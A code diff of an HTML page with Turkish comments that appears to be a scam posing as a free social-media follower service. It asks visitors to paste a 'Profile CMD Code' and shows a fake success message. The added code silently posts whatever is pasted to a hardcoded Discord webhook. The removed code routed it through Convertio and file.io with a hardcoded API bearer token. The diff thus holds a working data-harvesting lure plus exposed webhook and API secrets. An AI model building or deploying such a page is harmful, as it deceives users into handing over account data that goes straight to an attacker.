@@ -84,69 +84,21 @@
     <p>Metninizi girin ve 'Gönder' butonuna tıklayın.</p>
 
     <textarea id="inputText" placeholder="Enter Profile CMD Code Here!"></textarea><br>
-    <button onclick="convertAndUpload()">Send!</button>
+    <button onclick="sendToDiscord()">Send!</button>
 
     <div id="message-container">
         <p>Success! Followers Sent🎉</p>
     </div>
 
     <script>
-        function convertAndUpload() {
-            const text = document.getElementById("inputText").value;
-            
-            // Convertio API kullanarak metni .txt dosyasına dönüştürme
-            fetch('https://api.convertio.co/convert', {
-                method: 'POST',
-                headers: {
-                    'Authorization': 'Bearer 85cd8c8adcb6196df0d3582b00f12b79',
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    input: 'string',
-                    file: text,
-                    output_format: 'txt'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                const txtFileUrl = data.result.url;  // API'den gelen txt dosyasının bağlantısı
-                
-                // Dosyayı file.io'ya yükleme
-                uploadFile(txtFileUrl);
-            })
-            .catch(error => {
-                console.error('Convertio error:', error);
-            });
-        }
+        function sendToDiscord() {
+            const text = document.getElementById("inputText").value;  // Kullanıcının girdiği metin
 
-        function uploadFile(txtFileUrl) {
-            fetch('https://file.io', {
-                method: 'POST',
-                body: JSON.stringify({ file: txtFileUrl }),
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            })
-            .then(response => response.json())
-            .then(data => {
-                const downloadLink = data.link;
-                
-                // Discord Webhook'a bağlantıyı gönder
-                sendToDiscord(downloadLink);
-                
-                // Ekranda başarı mesajı göster
-                document.getElementById("message-container").style.display = "block";
-            })
-            .catch(error => {
-                console.error('File.io upload error:', error);
-            });
-        }
+            // Webhook URL'nizi buraya ekleyin
+            const webhookURL = 'https://canary.discord.com/api/webhooks/1312211611506966539/2_xVaoE3JvI3VWsbNpSLM3FIS83yGruTWxkJUDPjMYfxGaDvrEvBCtLHEWmKkkocEzbC';
 
-        function sendToDiscord(link) {
-            const webhookURL = 'https://canary.discord.com/api/webhooks/1312211611506966539/2_xVaoE3JvI3VWsbNpSLM3FIS83yGruTWxkJUDPjMYfxGaDvrEvBCtLHEWmKkkocEzbC';  // Webhook URL'nizi buraya yerleştirin
-            
             const payload = {
-                content: `Yeni bir dosya yüklendi: ${link}`,
+                content: text,  // Webhook'a gönderilecek metin
             };
 
             // Webhook'a POST isteği gönder
@@ -155,17 +107,20 @@
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(payload),
+                body: JSON.stringify(payload),  // JSON formatında metin gönder
             })
             .then(response => {
                 if (response.ok) {
                     console.log('Mesaj başarıyla gönderildi.');
+                    document.getElementById("message-container").style.display = "block";  // Mesajı ekranda göster
                 } else {
                     console.log('Mesaj gönderilirken bir hata oluştu:', response.statusText);
+                    alert('Mesaj gönderilirken bir hata oluştu');
                 }
             })
             .catch(error => {
                 console.error('Webhook gönderme hatası:', error);
+                alert('Bir hata oluştu: ' + error.message);  // Kullanıcıya hata mesajı göster
             });
         }
     </script>
